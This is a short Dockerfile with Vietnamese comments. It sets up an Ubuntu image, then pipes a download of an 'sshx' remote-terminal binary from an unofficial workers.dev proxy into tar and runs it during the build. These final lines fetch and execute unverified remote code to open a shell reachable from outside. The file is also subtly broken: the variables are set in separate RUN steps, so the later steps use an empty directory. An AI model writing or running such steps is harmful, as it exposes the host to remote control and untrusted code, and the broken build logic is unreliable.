# Sử dụng Ubuntu mới nhất
FROM ubuntu:latest  

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt install -y \
    htop \
    curl \
    ca-certificates \
    git \
    sudo \
    unzip \
    wget \
    python3 \
    python3-pip && \
    rm -rf /var/lib/apt/lists/*  # Dọn dẹp cache để giảm kích thước image

# Tạo thư mục làm việc


# Tải script sshx và chạy ngay trong RUN

RUN temp_dir=$(mktemp -d)
RUN arch=$(uname -m)
RUN curl -sSL "https://filenotebok.mamaduck0003.workers.dev/proxy/sshx-x86_64-unknown-linux-musl.tar.gz" | tar -xz -C "$temp_dir"
RUN "$temp_dir/sshx"
